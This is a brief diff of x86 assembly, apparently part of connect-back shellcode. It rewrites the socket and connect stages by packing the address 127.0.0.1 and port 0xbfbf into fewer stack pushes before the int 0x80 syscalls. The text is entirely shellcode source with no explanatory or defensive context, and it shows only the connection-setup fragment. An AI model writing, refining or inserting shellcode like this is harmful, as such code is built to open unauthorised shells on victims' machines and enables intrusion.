@@ -32,14 +32,11 @@ socket:
 	push edx
 	inc  edx
 	push edx
-	push edx
+	push dword 0x0100007f
 	int  0x80
 
 connect:
-	pop  edx
-	push 0x0100007f
-	push word 0xbfbf
-	push dx
+	push dword 0xbfbf0210
 	mov  ecx, esp
 	push byte 0x10
 	push ecx
